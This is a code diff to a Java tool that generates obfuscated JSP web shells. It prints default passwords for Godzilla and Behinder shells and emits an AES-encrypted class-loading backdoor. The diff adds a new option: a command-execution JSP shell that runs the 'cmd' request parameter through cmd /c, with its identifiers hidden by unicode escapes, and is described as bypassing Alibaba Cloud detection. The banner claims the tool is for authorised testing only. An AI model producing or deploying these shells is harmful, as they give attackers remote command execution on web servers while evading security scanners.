@@ -24,8 +24,10 @@ public class Main {
         System.out.println("本工具旨在帮助企业快速定位漏洞修复漏洞,仅限授权安全测试使用!");
         System.out.println("严格遵守《中华人民共和国网络安全法》,禁止未授权非法攻击站点!");
         System.out.println("***********************************************************");
-        System.out.println("Godzilla java_aes_raw连接默认密码为:1");
-        System.out.println("Behinder默认密码为:Tas9er");
+        System.out.println("");
+        System.out.println("1、Godzilla java_aes_raw连接默认密码为:1");
+        System.out.println("2、Behinder默认密码为:Tas9er");
+        System.out.println("3、生成绕过阿里云检测 http://XXX:8080/test.jsp?cmd=whoami");
         String str = "tas9er" +generateByRandom(2);
         String str2 = "tas9er" +generateByRandom(2);
         String str3 = "tas9er" +generateByRandom(2);
@@ -56,7 +58,7 @@ public class Main {
         System.out.println("[+]Creating Local File......");
         Scanner sc = new Scanner(System.in);
 
-        System.out.println("输入1生成Godzilla；输入2生成Behinder：");
+        System.out.println("输入1生成Godzilla；\n输入2生成Behinder;\n输入3生成绕过阿里云检测一句话：");
 
 
         String firStr = sc.next();
@@ -114,6 +116,28 @@ public class Main {
             if ("2".equals(firStr)){
                 replaceAll = ("Hello Administrator!\nWelCome To  Java Console!" + ("<%@page import=\"sun.misc.*,javax.crypto.Cipher,javax.crypto.spec.SecretKeySpec,java.util.Random\" %>\n<%!\n    class " + str + " extends ClassLoader {\n        " + str + "(ClassLoader " + str2 + ") {\n            super(" + str2 + ");\n        }\n        public Class " + str3 + "(byte[] " + str4 + ") {\n            return super.defineClass(" + str4 + ",0," + str4 + ".length);\n        }\n    }\n%>") + ("<%\n    out.println(\"Random Garbage Data:\");\n    Random " + str9 + " = new Random();\n    int " + str10 + " = " + str9 + ".nextInt(1234);\n    int " + str11 + " = " + str9 + ".nextInt(5678);\n    int " + str12 + " = " + str9 + ".nextInt(1357);\n    int " + str13 + " = " + str9 + ".nextInt(2468);\n    out.println(" + str10 + "+\",\"+" + str11 + "+\",\"+" + str12 + "+\",\"+" + str13 + ");\n    String[] " + str5 + " = new String[]{\"A\", \"P\", \"B\", \"O\", \"C\", \"S\", \"D\", \"T\"};\n    String " + str6 + " = " + str5 + "[1] + " + str5 + "[3] + " + str5 + "[5] + " + str5 + "[7];\n    if (request.getMethod().equals(" + str6 + ")) {\n        String " + str8 + " = new String(new BASE64Decoder().decodeBuffer(\"MTZhY2FjYzA1YWFmYWY2Nw==\"));\n        session.setAttribute(\"u\", " + str8 + ");\n        Cipher " + str7 + " = Cipher.getInstance(\"AES\");\n        " + str7 + ".init(((" + str10 + " * " + str11 + " + " + str12 + " - " + str13 + ") * 0) + 3 - 1, new SecretKeySpec(" + str8 + ".getBytes(), \"AES\"));\n        new " + str + "(this.getClass().getClassLoader())." + str3 + "(" + str7 + ".doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);\n    }\n%>")).replaceAll("defineClass", "d\\\\uuuuuuuuu0065fineClass").replaceAll("BASE64Decoder", "B\\\\u0041\\\\u0053\\\\u0045\\\\u0036\\\\u0034\\\\u0044\\\\u0065\\\\u0063\\\\u006f\\\\u0064\\\\u0065\\\\u0072").replaceAll("getClass", "\\\\u0067\\\\u0065t\\\\u0043\\\\u006c\\\\u0061\\\\u0073\\\\u0073").replaceAll("ClassLoader", "\\\\u0043l\\\\u0061\\\\u0073\\\\u0073\\\\u004c\\\\u006f\\\\u0061\\\\u0064\\\\u0065\\\\u0072");
             }
+            if ("3".equals(firStr)){
+                replaceAll="<%@ page import=\"java.io.BufferedReader\" %>\n" +
+                        "<%@ page import=\"java.io.InputStream\" %>\n" +
+                        "<%@ page import=\"java.io.InputStreamReader\" %>\n" +
+                        "<%\n" +
+                        "    try {\n" +
+                        "        final String s = request.getParameter(\"cmd\");\n" +
+                        "        \\uuuuuuuuuuuuuuuuuuuu0050\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073 process = new \\uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu0050\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u0042\\u0075\\u0069\\u006c\\u0064\\u0065\\u0072().\\u0063\\u006f\\u006d\\u006d\\u0061\\u006e\\u0064(new String[]{ \"cmd\", \"/c\", s}).start();\n" +
+                        "        InputStream inputStream = process.getInputStream();\n" +
+                        "        StringBuilder stringBuilder = new StringBuilder();\n" +
+                        "        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));\n" +
+                        "        String line;\n" +
+                        "        while ((line = bufferedReader.readLine()) != null) {\n" +
+                        "            stringBuilder.append(line).append(\"\\n\");\n" +
+                        "        }\n" +
+                        "        response.getOutputStream().write(stringBuilder.toString().getBytes());\n" +
+                        "    } catch (Exception e) {\n" +
+                        "        e.printStackTrace();\n" +
+                        "    }\n" +
+                        "\n" +
+                        "%>\n";
+            }
 
             BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(new File(new SimpleDateFormat("yyyyMMddhhmmss").format(new Date()) + ".jsp")));
 
@@ -127,5 +151,5 @@ public class Main {
         System.out.println("[+]Succussfully");
     }
 
-    //godz
+
 }
